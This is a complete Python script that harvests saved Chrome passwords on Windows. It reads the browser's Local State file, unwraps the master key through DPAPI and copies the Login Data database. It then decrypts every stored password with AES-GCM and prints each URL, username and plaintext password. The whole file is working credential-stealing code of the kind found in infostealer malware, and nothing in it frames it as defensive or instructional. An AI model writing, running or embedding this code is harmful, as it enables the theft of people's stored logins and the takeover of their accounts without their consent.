
import os, json, base64, win32crypt, shutil, sqlite3
from Crypto.Cipher import AES

CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))

def get_secret_key():
    try:
        #(1) Get secretkey from chrome local state
        with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        #Remove suffix DPAPI
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome secretkey cannot be found")
        return None

def fetch_data_from_local_db():
    chrome_path_login_db = CHROME_PATH + r"\Default\Login Data"
    
    shutil.copy2(chrome_path_login_db, "Loginvault.db") 
    
    #Connect to sqlite database
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
    
    #Select statement to retrieve info 
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    
    data = []
    
    for index, login in enumerate(cursor.fetchall()):
        url = login[0]
        username = login[1]
        ciphertext= login[2]
        
        data.append((url, username, ciphertext))
        
    return data
    
def decrypt(ciphertext, secret_key):
    #Step 1: Extracting initilisation vector from ciphertext
    initialisation_vector = ciphertext[3:15]
        
    #Step 2: Extracting encrypted password from ciphertext
    encrypted_password = ciphertext[15:-16]
        
    #Step 3:Build the AES algorithm to decrypt the password
    cipher = AES.new(secret_key, AES.MODE_GCM, initialisation_vector)
    
    decrypted_pass = cipher.decrypt(encrypted_password)
    
    decrypted_pass = decrypted_pass.decode()
    
    #Step 4: Decrypted Password    
    return decrypted_pass
    
def run():
    secret_key = get_secret_key()
    
    data = fetch_data_from_local_db()
    
    for index, login in enumerate(data):
        url = login[0]
        username = login[1]
        ciphertext= login[2]
        
        if not ciphertext or not url or not username:
            continue
        
        decrypted_pass = decrypt(ciphertext, secret_key)
        
        print("Url :", url)
        print("Username : ", username)
        print("Password : ", decrypted_pass)
        print()
        
if __name__ == "__main__":
    run()